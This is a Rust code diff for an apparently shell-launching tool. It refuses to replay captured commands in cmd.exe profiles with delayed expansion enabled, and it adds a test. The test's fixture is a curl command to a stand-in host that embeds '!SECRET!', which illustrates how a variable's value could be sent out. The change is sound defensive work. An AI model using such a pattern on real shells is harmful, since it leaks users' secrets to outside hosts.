@@ -90,7 +90,9 @@ pub fn arguments<S: AsRef<str>>(
     };
     let (line, returning) = match (replaying, creation) {
         (Some(words), _) => {
-            if kind == DirectShell::Wsl || !should_restore(words, denylist) {
+            // cmd's quoting escapes `!` once, which delayed expansion (`/V:ON`) would read as `!NAME!` anyway: such a
+            // shell gets no replay rather than a command whose arguments take variables' values
+            if kind == DirectShell::Wsl || !should_restore(words, denylist) || delayed_expansion(profile) {
                 return argv;
             }
             let Some(line) = ShellDialect::Cmd.line(words) else {
@@ -117,6 +119,21 @@ pub fn arguments<S: AsRef<str>>(
         }
     }
     argv
+}
+
+/// Whether `profile`'s CMD switches turn delayed expansion on (`/V:ON`, the last `/V` winning). The registry's
+/// `DelayedExpansion` default is not read: a replay cannot tell it.
+fn delayed_expansion(profile: &ShellProfile) -> bool {
+    profile
+        .args
+        .iter()
+        .rev()
+        .find_map(|arg| match arg.to_ascii_lowercase().as_str() {
+            "/v:on" => Some(true),
+            "/v:off" => Some(false),
+            _ => None,
+        })
+        .unwrap_or(false)
 }
 
 #[cfg(test)]
@@ -175,5 +192,24 @@ mod tests {
         assert_eq!(&payload[1..5], wsl.args);
         assert_eq!(&payload[5..], ["--exec", "/bin/sh", "-lc", "printf '%s' 'a b'"]);
         assert_eq!(arguments(&wsl, Some(&login), None, &empty), login);
+    }
+
+    #[test]
+    fn a_delayed_expansion_cmd_gets_no_replay_of_a_captured_command() {
+        let empty: [&str; 0] = [];
+        let captured = ["curl".to_owned(), "https://example.test/?q=!SECRET!".to_owned()];
+        let plain = ShellProfile::new("cmd", "CMD", "C:/Windows/System32/cmd.exe".into(), &["/D"]);
+        let replayed = arguments(&plain, Some(&captured), None, &empty);
+        assert_eq!(replayed[2..4], ["/S", "/K"]);
+        for args in [vec!["/D", "/V:ON"], vec!["/v:off", "/v:on"]] {
+            let delayed = ShellProfile::new("cmd", "CMD", "C:/Windows/System32/cmd.exe".into(), &args);
+            assert_eq!(
+                arguments(&delayed, Some(&captured), None, &empty)[1..],
+                delayed.args,
+                "{args:?}"
+            );
+        }
+        let off = ShellProfile::new("cmd", "CMD", "C:/Windows/System32/cmd.exe".into(), &["/V:ON", "/V:OFF"]);
+        assert_eq!(arguments(&off, Some(&captured), None, &empty).len(), 6);
     }
 }
